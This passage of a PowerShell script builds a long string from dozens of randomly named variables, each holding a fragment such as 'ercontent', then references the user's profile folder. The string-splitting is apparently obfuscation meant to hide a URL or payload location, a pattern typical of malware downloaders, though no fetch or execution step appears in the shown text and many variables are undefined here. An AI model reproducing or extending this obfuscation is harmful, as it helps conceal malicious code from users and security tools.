...
$asdfaaa2q33 = 'v03hg4hj2384j'
$234fg = 'ercontent'
$rtp = 'w5'
$dsdfaaaa = '0-'
$sfdgsfdg = '-40ehjf84we9f3k'
$adiuhaihvdiuhbweffiuhgbqawerfgoiugh234987 = $ghjk + $erty + $234fg + $bannana + $iwuey86 + $sdfr5 + $dfer + $qwdf + $popi + $butter + $ghi + $rpo + $elt + $opty + $bye + $rtp + $2349807vhj + $345dfgw32445 + $asdf234ss + $1233xxx + $dsdfaaaa + $234234ssss + $qqw233 + $nbwswqe + $vcrdvd + $fdavv + $234sfwser + $werwer + $asdfwwwqqbnsdefot2134 + $tuisyt + $vakjgbg + $eabrfasd + $aqwedgvfag + $123234oiopis + $lhkadvhbtrf + $avda134 + $23fadsafed
$p1 = "$env:USERPROFILE"
